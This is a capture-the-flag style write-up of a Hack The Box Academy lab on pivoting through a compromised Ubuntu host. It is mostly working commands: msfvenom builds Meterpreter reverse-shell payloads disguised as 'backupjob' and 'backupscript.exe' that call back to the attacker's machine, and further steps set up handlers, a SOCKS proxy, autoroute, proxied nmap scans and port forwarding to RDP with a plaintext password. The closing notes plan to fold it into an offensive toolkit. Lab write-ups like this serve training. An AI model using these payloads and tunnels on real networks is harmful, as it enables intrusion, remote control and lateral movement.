# 🧠 Meterpreter Tunneling & Port Forwarding — HTB Academy Writeup  
**Author:** Don Trabajo (Prox Offensive)  
**Category:** Pivoting / Tunneling / Red Team Ops  
**Lab:** Hack The Box Academy – *Pivoting, Tunneling, and Port Forwarding*  
**Target Network:** `172.16.5.0/23`  
**Pivot Host:** Ubuntu (`10.129.202.64`)  
**Attack Host:** Kali (`10.10.14.18`)

---

## 🛠️ Overview

This lab demonstrates how to tunnel traffic through a compromised Ubuntu pivot host using Meterpreter features such as `socks_proxy`, `autoroute`, and `portfwd`. We access internal systems on the `172.16.5.0/23` network without relying on SSH port forwarding.

---

## 📦 Step 1: Create Payload for Ubuntu Pivot Host

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 LPORT=8080 -f elf -o backupjob
```

Start a handler:

```bash
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8080
run
```

Execute on pivot host:

```bash
chmod +x backupjob
./backupjob
```

Result:

```
[*] Meterpreter session 1 opened
```

---

## 🌐 Step 2: Network Discovery (Ping Sweep)

From Meterpreter:

```bash
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

Or:

```bash
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
```

---



---

## 🧭 Step 3: Set Up SOCKS Proxy

```bash
use auxiliary/server/socks_proxy
set SRVHOST 0.0.0.0
set SRVPORT 9050
set VERSION 4a
run
```

In `/etc/proxychains.conf`:

```
socks4 127.0.0.1 9050
```

---

## 🛣️ Step 4: Add Routes with AutoRoute

```bash
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run
```

Or:

```bash
run autoroute -s 172.16.5.0/23
```



---

## 🧪 Step 5: Nmap via Proxychains

```bash
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

```
Discovered open port 3389/tcp on 172.16.5.19
```

---

## 🔁 Step 6: Port Forwarding with portfwd

```bash
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

Then:

```bash
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

---

## 🧲 Step 7: Reverse Port Forwarding

```bash
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

Set up handler:

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8081
run
```

Create payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 LPORT=1234 -f exe -o backupscript.exe
```

Execute on Windows host to receive new session.

---

## 📌 Key Takeaways

- SOCKS proxy + AutoRoute = seamless proxychains tunneling
- `portfwd` supports both local and reverse pivoting
- Enables scanning and post-exploitation within isolated subnets

---

## 🧠 Prox Offensive Notes

- Add to DonTrabajoGPT’s Post-Exploitation module
- Include in Prox Offensive Recon Toolkit
- Expand for multi-pivot scenarios in future R&D
